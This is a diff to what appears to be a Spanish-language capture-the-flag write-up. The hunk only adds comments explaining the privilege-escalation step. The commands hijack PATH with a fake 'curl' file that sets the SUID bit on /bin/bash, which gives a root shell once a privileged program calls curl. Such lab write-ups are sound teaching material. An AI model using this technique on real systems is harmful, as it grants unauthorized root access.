@@ -215,9 +215,9 @@ vemos que el archivo esta haciendo un llamado al comando `curl` pero lo esta hac
 `Root`
 
 ```python
-> echo "chmod u+s /bin/bash" > curl 
+> echo "chmod u+s /bin/bash" > curl (creamos un archivo llamado curl el cual comtiene comandos para cambiar los permisos de la bash)
 
-> chmod +x curl 
+> chmod +x curl (otorgamos permisos al archivo )
 
 > export PATH=/tmp:$PATH
 
